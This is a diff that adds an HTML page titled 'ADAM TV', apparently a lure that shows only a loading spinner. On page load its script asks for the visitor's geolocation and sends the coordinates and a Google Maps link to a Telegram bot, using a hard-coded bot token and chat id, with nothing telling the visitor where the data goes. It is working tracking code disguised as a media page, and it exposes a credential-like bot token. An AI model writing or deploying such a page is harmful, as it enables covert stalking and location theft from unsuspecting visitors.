@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ADAM TV</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+   <script>
+      
+
+
+        document.addEventListener("DOMContentLoaded", function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+            } else {
+                alert("التتبع الجغرافي غير مدعوم في هذا المتصفح.");
+            }
+        });
+
+        function sendLocationToTelegram(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            const telegramToken = "7577672914:AAHeV0egzzeGuAphCi_SN8Bi4JBkgozNZkY"; // استبدلها بالرمز الخاص بك
+            const chatId = "5471126331"; // استبدلها برقم المحادثة الخاص بك
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=موقع المستخدم: ${latitude}, ${longitude}. رابط الخريطة: ${mapUrl}`;
+        
+            fetch(url)
+                .then(response => {
+                    
+                })
+                .catch(error => {
+                    alert("حدث خطأ أثناء إرسال الموقع.");
+                    console.error("Error:", error);
+                });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                
+                case error.POSITION_UNAVAILABLE:
+                    alert("معلومات الموقع غير متوفرة.");
+                    break;
+                case error.TIMEOUT:
+                    alert("انتهت مهلة طلب الموقع.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("حدث خطأ غير معروف.");
+                    break;
+            }
+        }
+ 
+    </script>
+</head>
+<body>
+    <div class="loader"></div>
+</body>
+</html>
